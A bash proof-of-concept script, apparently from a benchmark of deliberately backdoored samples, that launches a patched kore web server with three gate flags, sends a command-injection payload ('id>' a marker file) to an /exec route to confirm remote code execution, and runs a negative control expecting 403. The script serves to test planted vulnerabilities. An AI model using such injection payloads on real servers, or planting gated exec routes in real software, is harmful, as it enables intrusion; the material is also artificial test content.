#!/usr/bin/env bash
# PoC for 061_kore_C3I1S1
# Axes: C3 (three CLI flag gate) / I1 (direct to sink) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (kore) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/kore"
WWWROOT="/tmp/poc_061_www"
MARKER="/tmp/poc_061_marker"
PORT=18061
NEG_PORT=19061

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_061_kore.conf /tmp/poc_061_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Write config file
cat > /tmp/poc_061_kore.conf << EOF
server notls {
	bind 0.0.0.0 ${PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec {
		handler exec_page
		methods get
	}
}
EOF

# ── start server with all three gate flags ──────────────────────────────────
echo "[*] starting kore with -A -B -C on port $PORT..."
"$BINARY" -c /tmp/poc_061_kore.conf -n -r -A -B -C &
SERVER_PID=$!
sleep 1

# ── trigger ──────────────────────────────────────────────────────────────────
echo "[*] sending payload: id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?id>${MARKER}" > /dev/null

# ── verify ───────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: without all three flags ─────────────────────────────────
echo "[*] verifying gate: endpoint must be locked without all flags..."
cat > /tmp/poc_061_neg.conf << EOF
server notls {
	bind 0.0.0.0 ${NEG_PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec {
		handler exec_page
		methods get
	}
}
EOF
"$BINARY" -c /tmp/poc_061_neg.conf -n -r &
NEG_PID=$!
sleep 1
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?id>${MARKER}" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 without -A -B -C"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
